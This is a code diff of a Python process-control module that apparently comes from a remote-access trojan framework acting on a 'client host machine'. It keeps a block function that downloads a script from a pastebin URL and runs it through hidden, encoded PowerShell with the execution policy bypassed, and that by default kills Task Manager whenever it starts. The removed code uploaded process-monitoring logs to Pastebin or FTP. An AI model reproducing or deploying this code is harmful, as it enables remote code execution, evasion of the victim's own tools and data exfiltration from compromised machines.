@@ -18,17 +18,45 @@ import collections
 import util
 
 # globals
-packages  = []
+packages  = ['wmi','pythoncom'] if os.name == 'nt' else []
 platforms = ['win32','linux2','darwin']
 usage = 'process <list/search/kill>'
 description = """ 
 List/search/kill currently running processes on the client host machine
 """
-_buffer = StringIO.StringIO()
-_workers = {}
-_abort  = False
+log = StringIO.StringIO()
 
 # main
+def _monitor(keyword):
+    if os.name != 'nt':
+        return "Error: Windows platforms only"
+    try:
+        import wmi
+        import pythoncom
+        pythoncom.CoInitialize()
+        c = wmi.WMI()
+        if not len(globals()['log'].getvalue()):
+            globals()['log'].write('Time, Owner, Executable, PID, Parent\n')
+        process_watcher = c.Win32_Process.watch_for("creation")
+        while True:
+            try:
+                new_process = process_watcher()
+                proc_owner = new_process.GetOwner()
+                proc_owner = "%s\\%s" % (proc_owner[0], proc_owner[2])
+                create_date = new_process.CreationDate
+                executable = new_process.ExecutablePath
+                pid = new_process.ProcessId
+                parent_pid = new_process.ParentProcessId
+                row = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
+                if keyword in row:
+                    globals()['log'].write(row)
+            except Exception as e1:
+                util.log("{} error: {}".format(monitor.func_name, str(e1)))
+            if globals()['_abort']:
+                break
+    except Exception as e2:
+        util.log("{} error: {}".format(monitor.func_name, str(e2)))
+
 def list(*args, **kwargs):
     """ 
     List currently running processes
@@ -49,7 +77,6 @@ def list(*args, **kwargs):
         return json.dumps(output)
     except Exception as e:
         util.log("{} error: {}".format(list.func_name, str(e)))
-
 
 def search(keyword):
     """ 
@@ -76,7 +103,6 @@ def search(keyword):
         return json.dumps(output)
     except Exception as e:
         util.log("{} error: {}".format(search.func_name, str(e)))
-
 
 def kill(process_id):
     """ 
@@ -108,77 +134,20 @@ def kill(process_id):
     except Exception as e:
         util.log("{} error: {}".format(kill.func_name, str(e)))
 
-
-@util.threaded
-def monitor(name):
+def monitor(keyword):
     """ 
     Monitor the host machine for process creation with the given keyword in the name
 
     `Required`
-    :param str name:    process name
+    :param str keyword:    process name/keyword
 
     """
-    if os.name != 'nt':
-        return "Error: Windows platforms only"
-    try:
-        import wmi
-        import pythoncom
-        pythoncom.CoInitialize()
-        c = wmi.WMI()
-        if not len(globals()['_buffer'].getvalue()):
-            globals()['_buffer'].write('Time, Owner, Executable, PID, Parent\n')
-        globals()['_workers'][logger.func_name] = logger()
-        process_watcher = c.Win32_Process.watch_for("creation")
-        while True:
-            try:
-                new_process = process_watcher()
-                proc_owner  = new_process.GetOwner()
-                proc_owner  = "%s\\%s" % (proc_owner[0], proc_owner[2])
-                create_date = new_process.CreationDate
-                executable  = new_process.ExecutablePath
-                pid         = new_process.ProcessId
-                parent_pid  = new_process.ParentProcessId
-                row         = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
-                if not keyword:
-                    globals()['_buffer'].write(row)
-                else:
-                    if keyword in row:
-                        globals()['_buffer'].write(row)
-            except Exception as e1:
-                util.log("{} error: {}".format(monitor.func_name, str(e1)))
-            if globals()['_abort']:
-                break
-    except Exception as e2:
-        util.log("{} error: {}".format(monitor.func_name, str(e2)))
+    t = threading.Thread(target=_monitor, args=(keyword,), name=time.time())
+    t.daemon = True
+    t.start()
+    return t
 
-
-@util.threaded
-def logger(mode='ftp'):
-    """ 
-    Upload the log to Pastebin or FTP server at a regular interval
-
-    `Optional`
-    :param str mode:    ftp, pastebin
-
-    """
-    try:
-        while True:
-            if globals()['_buffer'].tell() > max_bytes:
-                global _buffer
-                try:
-                    result = util.pastebin(_buffer) if 'ftp' not in mode else util.ftp(_buffer)
-                    results.append(result)
-                    _buffer.reset()
-                except Exception as e:
-                    util.log("{} error: {}".format(logger.func_name, str(e)))
-            elif globals()['_abort']:
-                break
-            else:
-                time.sleep(5)
-    except Exception as e:
-        util.log("{} error: {}".format(logger.func_name, str(e)))
-
-def blocker(process_name='taskmgr.exe'):
+def block(process_name='taskmgr.exe'):
     """ 
     Block a process from running by immediately killing it every time it spawns
 
@@ -186,11 +155,15 @@ def blocker(process_name='taskmgr.exe'):
     :param str process_name:    process name to block (default: taskmgr.exe)
 
     """
-    code = urllib.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
-    if os.path.isfile(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'):
-        powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' 
-    elif os.path.isfile(os.popen('where powershell').read().rstrip()):
-        powershell = os.popen('where powershell').read().rstrip()
-    else:
-        return "Error: unable to find powershell.exe"
-    return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+    try:
+        code = urllib.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
+        if os.path.isfile(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'):
+            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' 
+        elif os.path.isfile(os.popen('where powershell').read().rstrip()):
+            powershell = os.popen('where powershell').read().rstrip()
+        else:
+            return "Error: unable to find powershell.exe"
+        _ = os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+        return "Process {} blocked".format(process_name)
+    except Exception as e:
+        util.log("{} error: {}".format(blocker.func_name, str(e)))
